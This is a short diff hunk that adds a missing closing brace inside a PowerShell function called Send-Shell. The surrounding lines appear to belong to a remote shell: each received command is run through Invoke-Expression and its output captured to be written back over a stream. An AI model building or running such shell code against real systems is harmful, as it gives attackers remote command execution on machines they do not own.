@@ -112,7 +112,7 @@ function Send-Shell
                 $StreamWriter.Flush()
                 continue
             }
-
+        }
         $Output = try {
                         $out = Invoke-Expression $cmd 2>&1 | Out-String
                             if ($out.Length -gt 0){
